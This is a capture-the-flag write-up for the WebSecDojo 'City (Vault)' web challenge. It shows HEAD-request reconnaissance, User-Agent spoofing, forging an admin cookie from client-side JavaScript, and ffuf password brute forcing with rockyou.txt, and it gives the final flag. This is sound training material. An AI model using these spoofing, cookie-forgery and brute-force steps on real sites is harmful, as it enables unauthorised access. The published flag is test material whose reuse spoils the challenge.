---
title: "City (Vault)"
date: 2026-03-20
categories:
  - Web
tags:
  - Web
  - WebSecDojo
collections:
  - WebSecDojo
---



{{< admonition tldr "TL;DR" >}}

**City (Vault)** is a web challenge from **WebSecDojo**. This challenge tests the ability to analyze HTTP protocols, manipulate headers, understand *client-side logic* (JavaScript), and *brute forcing* techniques in multilevel authentication forms.

{{< /admonition >}}

## Challenge Overview

This challenge tests the ability to analyze HTTP protocols, manipulate headers, understand *client-side logic* (JavaScript), and *brute forcing* techniques in multilevel authentication forms.

---

## Step 1: Reconnaissance (HTTP Method)

Perform an initial check on the `/vault/` endpoint:

```bash
curl https://websecdojo.com/vault/
```

Found a hint in the HTML code:
> *Don't get a HEAD of yourself.*

The term **aHEAD** refers to the HTTP method **HEAD**. Perform header inspection using these methods:

```bash
curl -I https://websecdojo.com/vault/
```

Suspicious header output:

```http
banker-agent-access: You need to be Agent33
```

---

## Step 2: User-Agent Spoofing

Based on the instructions in Step 1, the server validates the identity via the `User-Agent` header. Change User-Agent to `Agent33` :

```bash
curl -A "Agent33" https://websecdojo.com/vault/
```

The response changes to:
> *Identified banker Agent33. Please provide a secret cookie.*

---

## Step 3: Analyze Cookie Logic

At this point, a new JavaScript file is loaded at the bottom of the HTML: `static/js/cookie.js` . Check the contents of the file:

```bash
curl https://websecdojo.com/vault/static/js/cookie.js
```

Cookie creation logic found:

```javascript
cookie_value = getCookie("admins");
if(cookie_value == btoa(CryptoJS.MD5("true").toString())){ ... }
```

Calculate cookie value manually:
1. **MD5("true")**: `b326b5062b2f0e69046810717534cb09` 2. **Base64(MD5)**: `YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=` ---

## Step 4: Access Phase 1

Send a request with the User-Agent and Cookie that has been created:

```bash
curl -A "Agent33" --cookie "admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" https://websecdojo.com/vault/
```

The response indicates the first phase is complete:
> *Login phase 1 completed.*

The page now displays the `POST` form for password input.

---

## Step 5: Brute Force Passwords

Use `ffuf` to brute force the `password` parameter using wordlist `rockyou.txt` . Filter responses containing failure messages from Phase 1:

```bash
ffuf -u https://websecdojo.com/vault/ -X POST \
     -H "User-Agent: Agent33" \
     -H "Cookie: admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" \
     -d "password=FUZZ" \
     -w /usr/share/wordlists/rockyou.txt \
     -fr "Login phase 1 completed."
```

Password identification results that provide different responses (Size 0):
* `rambo` * `catsrule` ---

## Step 6: Extracting Access Code

Test the found password using `curl` and check the response header ( `-i` ):

```bash
curl -i -X POST -A "Agent33" \
     --cookie "admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" \
     -d "password=catsrule" \
     https://websecdojo.com/vault/
```

Found a new header containing the access code:

```http
bank-access-code: 1573!
```

---

## Step 7: Final Authentication (The Flag)

Use the access code `1573!` as the final password to open the safe:

```bash
curl -X POST -A "Agent33" \
     --cookie "admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" \
     -d "password=1573!" \
     https://websecdojo.com/vault/
```

Final response:

```html
<h2>
  <b>Hamu bank login</b>
  <br>
  Congrats! Flag is: flag#B4nk5Ar3c00l!
</h2>
```

---

## Final Flags

```
flag#B4nk5Ar3c00l!
```
